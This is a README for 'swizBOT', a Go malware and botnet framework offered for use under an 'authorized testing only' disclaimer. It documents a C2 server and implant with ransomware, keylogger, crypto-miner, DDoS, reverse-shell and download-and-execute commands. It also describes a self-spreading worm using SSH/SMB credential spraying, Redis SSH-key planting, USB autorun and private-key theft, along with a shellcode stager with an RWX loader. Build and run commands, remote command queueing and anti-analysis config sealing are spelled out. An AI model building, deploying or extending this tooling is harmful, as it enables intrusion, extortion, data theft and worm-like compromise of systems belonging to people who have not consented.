# swizBOT

Modular Go implant framework with a CALL/POP stager (Jake Swiz decoder
technique), a polling HTTPS C2, an operator dashboard, plugin actions,
and a lateral-movement worm module.

by ek0ms savi0r, Church of Malware. Decoder technique after Jake Swiz
(0xXyc) / Fukahi Teki0 research.

For authorized security testing and education only.

## Layout

| Path | What it is |
|------|------------|
| cmd/c2 | C2 server: implant API, operator API, WebSocket, embedded dashboard |
| cmd/bot | Implant: beacon loop, failover, plugins dispatch, worm module |
| internal/plugins | Action modules (ddos, miner, file encryption, reverse shell, keylogger) |
| stager | XOR/LFSR CALL/POP stager encoder (x86/x64) + decoder listings |
| web | dashboard sources (embedded into the c2 binary at build time) |

## Quick start (lab)

```bash
# build the C2 and the Linux implant
make c2 bot-linux

# self-signed cert for the TLS implant listener
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt \
  -days 365 -nodes -subj '/CN=localhost'

# run the C2: operator UI on :8080, implant listener (TLS) on :8443
# -token protects every operator endpoint; -bot-secret is required from implants
./bin/swizbot-c2 -token 'change-me' -bot-secret 'shared-secret'

# register an implant against it (env-driven, no rebuilds)
SWIZ_C2_URLS=https://127.0.0.1:8443 \
SWIZ_BOT_SECRET=shared-secret \
SWIZ_BOT_ID=lab-1 \
./bin/swizbot-bot-linux

# queue a command (operator API)
curl -s -H 'X-C2-Token: change-me' \
  'http://127.0.0.1:8080/command?bot_id=lab-1&cmd=exec&payload=id'

# watch the result stream in the dashboard at http://127.0.0.1:8080
```

For Windows targets build the GUI implant:

```bash
make bot-windows          # bin/swizbot-bot.exe (amd64, windowsgui)
```

## Dashboard

The C2 serves a single-file dashboard (terminal theme, no external
assets) on the operator listener:

- bot list with OS/arch/IP/last-seen and live online state
- per-type command builder (exec, download, ddos, shell, miner,
  ransomware, keylog, worm, kill) with broadcast mode
- WebSocket event stream for registrations and command results, with
  polling fallback
- token login screen when the C2 runs with -token

## Commands

| type | payload | behavior |
|------|---------|----------|
| exec | shell command | runs via cmd.exe /C or /bin/sh -c |
| download | http(s) URL | downloads to a temp file, chmod +x, executes |
| fetch | file path | pulls a file back from the implant (base64 result, 4 MB cap) |
| screenshot | - | captures the primary display (Windows build) and returns the PNG |
| ddos | `host:port method seconds` | udp/tcp/http flood for the given window |
| shell | `host port` | reverse shell loop (line protocol, auto reconnect) |
| miner | `pool wallet [threads] [path|url]` | runs an xmrig-compatible binary |
| ransomware | operator RSA public key (PEM) | AES-256-GCM per-file, RSA-OAEP key wrap |
| keylog | optional log path | GetAsyncKeyState logger (Windows build) |
| worm | optional `subnets CSV` | lateral movement module (see below) |
| kill | - | removes persistence and exits |

Every command reports a result: `success` only when the action was
actually started/completed, `failed` with the reason otherwise. Unknown
command types are rejected, not silently ignored.

## Implant configuration (environment)

| variable | default | purpose |
|----------|---------|---------|
| SWIZ_C2_URLS | https://127.0.0.1:8443 | comma-separated operator endpoints, tried in random order |
| SWIZ_BOT_ID | hostname_pid | implant identifier reported to the C2 |
| SWIZ_BOT_SECRET | - | sent as X-Bot-Secret; required if the C2 runs -bot-secret |
| SWIZ_BOT_KEY | - | implant X25519 private key (hex); enables the sealed channel |
| SWIZ_C2_PUBKEY | - | operator X25519 public key (hex); encrypts results to the C2 |
| SWIZ_XOR | 0xaa | result body obfuscation byte, must match the C2 -xor |
| SWIZ_INTERVAL | 30s | beacon interval |
| SWIZ_JITTER | 30s | random sleep added to the interval |
| SWIZ_BACKOFF_MAX | 1h | max exponential backoff when every endpoint is down |
| SWIZ_DNS_DOMAIN | - | TXT record domain checked for additional endpoints |
| SWIZ_P2P | 0 | LAN peer discovery (UDP broadcast, see docs) |
| SWIZ_PEER_PORT | 31337 | peer discovery port |
| SWIZ_TELEGRAM_TOKEN | - | dead-drop fallback (bot API token) |
| SWIZ_TELEGRAM_CHAT_ID | - | optional chat filter for the dead drop |
| SWIZ_LOG | - | log file (stderr when unset) |
| SWIZ_UNLOCK | - | passphrase that unlocks a `-seal`ed baked config (see docs/BAKED-CONFIG.md) |
| SWIZ_WORM_SUBNETS | - | worm target subnets CSV override |
| SWIZ_WORM_DOWNLOAD_URL | - | hosted implant binary for cross-OS deployment |
| SWIZ_WORM_RESCAN | 10m | worm rescan interval |

Results are cached locally when every endpoint is unreachable and
flushed on the next successful contact. The XOR byte is obfuscation,
not encryption: transport security comes from the TLS listener.

## Baked config (compile-time)

`cmd/build` compiles config into the implant so a deployment is a single
artifact. All values are packed into one opaque token (`internal/bakepack`),
never injected as plaintext `-ldflags -X` symbols:

```bash
# obfuscated (default): no readable secrets in the binary
make payload C2_URLS=https://c2.example:8443 BOT_SECRET=s3cret OS=linux

# sealed: AES-256-GCM under a passphrase -> zero-leak artifact
make payload SEAL='correct horse battery staple' \
  C2_URLS=https://c2.example:8443 BOT_SECRET=s3cret OS=linux
# ...then run with SWIZ_UNLOCK='correct horse battery staple'
```

Precedence is **env > baked > default**. The obfuscated mode defeats
`strings`/static triage; the sealed mode is real encryption and leaves the
binary inert without `SWIZ_UNLOCK`. Baking secrets without `-seal` prints a
warning. Full rationale, threat model and limits: docs/BAKED-CONFIG.md.

## C2 configuration (flags)

| flag | default | purpose |
|------|---------|---------|
| -ui | :8080 | operator UI/API listener |
| -listen | :8443 | implant listener (TLS) |
| -cert / -key | server.crt / server.key | TLS keypair |
| -insecure | false | plain HTTP implant listener (lab) |
| -tunnel | none | outbound tunnel: cloudflared quick tunnel in front of -ui |
| -token | - | operator token (X-C2-Token header or login cookie) |
| -bot-secret | - | secret implants must present |
| -bot-key | - | operator X25519 private key; enables the sealed bot channel |
| -bot-key-gen | - | print a fresh operator keypair and exit |
| -xor | 0xaa | result obfuscation byte |
| -prune-hours | 24 | drop bots unseen for N hours (0 disables) |

Fleet pause/resume (reversible kill switch): queue `cmd=pause` with
`bot_id=*` to stop all command delivery; implants slow-poll so
`cmd=resume` reaches them. Paused state is server-side, so a resume
always re-enables the fleet.

Failover layers: the implant carries the same sealed frames over an
ordered channel stack (HTTPS -> DNS -> Telegram dead-drop), failing
over automatically when a layer stops answering. Layer order,
health/probation semantics and per-layer setup: docs/TRANSPORTS.md.

Bot endpoints are `/checkin` and `/result`; operator endpoints are
`/command`, `/list`, `/api/bots`, `/api/command`, `/ws`, `/login`, and
the dashboard at `/`.

## Sealed bot channel

When the C2 runs with `-bot-key` and implants carry `SWIZ_BOT_KEY` (their
own X25519 keypair) plus `SWIZ_C2_PUBKEY` (the operator public key), the
payload layer upgrades from single-byte XOR to per-frame AEAD:

- every checkin response (command) is sealed to the implant's registered
  public key; the implant opens it with its own private key;
- every result is sealed with a fresh ephemeral X25519 key against the
  operator public key (forward secrecy); the C2 opens it with `-bot-key`;
- tampered or wrong-key frames are rejected (GCM auth).

Generate the operator keypair once: `swizbot-c2 -bot-key-gen`. Distribute
`SWIZ_BOT_KEY` per implant (or fleet) and `SWIZ_C2_PUBKEY` from the
generator output. Without keys the channel falls back to TLS + XOR
obfuscation for lab use.

Command delivery is at-least-once: an undelivered command is redelivered
after 2 minutes up to 3 times and then dropped if never acknowledged.

## Bot protocol

- checkin: `GET /checkin?bot_id=..&os=..&arch=..` with
  `X-Bot-Secret`; returns `{"id","type","payload","target"}`; an empty
  `id` means nothing is queued.
- result: `POST /result`, body is the JSON result XOR-masked with the
  configured byte: `{"bot_id","command_id","output","status"}`.
- command (operator): `GET /command?...` or `POST /command` with a
  JSON body `{"bot_id","type","payload","target"}`; `bot_id=*`
  broadcasts to every known implant.

## Worm module

Activated only by the `worm` command (never at boot). It scans the
target subnets and dispatches open ports to real deploy modules:

| vector | port | notes |
|--------|------|-------|
| ssh | 22 | Go-native credential spray + stolen-key auth; stages the implant via sftp-less pipe and launches it detached |
| smb | 445 | net.exe credential spray, ADMIN$ copy, remote scheduled task (Windows build) |
| redis | 6379 | RESP config rewrite that plants an authorized SSH key (only with harvested key material; no fake keys) |
| web | 80/443/8080/8443 | sensitive-path recon; reports findings, never claims infections |
| usb | - | removable drive copy + autorun.inf + .lnk (Windows build) |
| shares | - | writable network share and public Startup copy (Windows build) |
| harvest | - | local config/log credential extraction and .ssh private-key theft feeding the spray lists |

Subnets: `worm` payload CSV, SWIZ_WORM_SUBNETS, or the local /24.
Cross-OS deployment uses SWIZ_WORM_DOWNLOAD_URL when set, otherwise the
implant copies itself (same-OS spreads). Success is counted only on a
verified outcome per vector. The module is exercised by unit and
integration tests (Redis vector runs against a live fake RESP server in
the test suite); the full spread loop is not executed on this host.

## Stager

The stager prepends a position-independent CALL/POP decoder to an
XOR- or LFSR-encoded raw payload:

```bash
# XOR loop decoder (x86)
python3 stager/encoder.py payload.bin out/stager.bin

# polymorphic LFSR stream, 64-bit decoder + C loader
python3 stager/encoder.py payload.bin out/stager.bin --lfsr --arch x64 --loader

# unrolled decoder, no loop instruction (payload up to 255 bytes)
python3 stager/encoder.py payload.bin out/stager.bin --noloop

# full verification: emulated decode round-trips + nasm byte parity
python3 stager/encoder.py --selftest
```

- modes: `xor` (fixed key), `lfsr` (32-bit LFSR, key changes per byte),
  `noloop` (unrolled). xor/noloop payloads up to 255 bytes for noloop;
  loop modes up to 65535 bytes.
- architectures: x86 and x64 (positions documented in
  stager/decoder_x86.asm and decoder_x64.asm, verified byte-for-byte
  against the emitted stubs by --selftest when nasm is available).
- `--loader` writes a loader.c (VirtualAlloc RWX + memcpy + call);
  compile with i686- or x86_64-w64-mingw32-gcc, add -mwindows for a GUI
  binary.

The technique (CALL/POP, in-memory decode, execute) follows Jake Swiz's
published decoder research; execution verification here is done in the
instruction emulator rather than on Windows hardware.

## Testing

```bash
make test                 # go test ./... (server, implant, plugins, bakepack)
make vet
make leakscan             # prove baked config is not string-recoverable
make stager-selftest      # encoder round-trips + listing parity
```

The test suite covers the full operator lifecycle (register, queue,
deliver, result, ack, redelivery, drop), auth gates, the implant
checkin/exec/result round trip against a live HTTP server, plugin
behavior (ransomware AES/RSA round trip on real files, DDoS validation,
miner resolution), the Redis worm vector against a live fake RESP
server, subnet enumeration, the transport manager (per-layer health,
probation/backoff, auto-recovery) and 20 stager decode round-trips.

docs/VERIFICATION.md records the honest surface: what is live-verified
(Linux E2E, b1/b2 baked config, DNS fallback, Windows
registration/exec/screenshot/persistence under Wine) versus
compiled/unit-only (Telegram, P2P, SMB/USB/share, schtasks, stager on
real hardware) versus deliberately not executed (the worm spread loop).

## Credits

- Jake Swiz (0xXyc) - CALL/POP XOR decoder and loader technique,
  PEB walking and ASLR research that this stager builds on.
- ek0ms savi0r - Go framework, C2, dashboard, plugins, worm module.

## Disclaimer

For educational purposes and authorized security testing only. The
operator is responsible for compliance with applicable law and for
obtaining authorization before testing any system.
